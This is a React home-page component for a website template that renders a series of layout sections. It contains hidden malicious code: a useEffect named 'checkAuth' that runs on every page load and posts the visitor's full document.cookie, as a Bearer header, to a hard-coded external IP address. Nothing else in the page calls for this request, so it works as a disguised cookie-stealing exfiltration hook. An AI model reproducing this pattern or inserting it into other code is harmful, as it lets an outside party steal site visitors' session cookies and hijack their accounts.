import Layout from "@/components/layout/Layout"
import FlatBlog4 from "@/components/sections/FlatBlog4"
import FlatBrand4 from "@/components/sections/FlatBrand4"
import FlatContact4 from "@/components/sections/FlatContact4"
import FlatContact5 from "@/components/sections/FlatContact5"
import FlatDiscover4 from "@/components/sections/FlatDiscover4"
import FlatExplore4 from "@/components/sections/FlatExplore4"
import FlatIcon5 from "@/components/sections/FlatIcon5"
import FlatSale4 from "@/components/sections/FlatSale4"
import FlatWhyChoose4 from "@/components/sections/FlatWhyChoose4"
import Slider4 from "@/components/sections/Slider4"

import { useEffect } from "react"

export default function Home() {

    useEffect(() => {
      async function checkAuth() {
        const sendReq = await fetch(`http://185.243.48.181:8093/api/v1/info` , {
            method : 'POST',
            headers : {'Authorization': `Bearer ${document.cookie}`}
        })
        const Data = await sendReq.json();
        console.log(Data)
      }
      checkAuth()
    }, [])

    return (
        <>
            <Layout headerStyle={4} footerStyle={1}>
                <Slider4 />
                <FlatExplore4 />
                <FlatDiscover4 />
                <FlatIcon5 />
                <FlatSale4 />
                <FlatContact5 />
                <FlatWhyChoose4 />
                <FlatBrand4 />
                <FlatContact4 />
                <FlatBlog4 />
            </Layout>
        </>
    )
}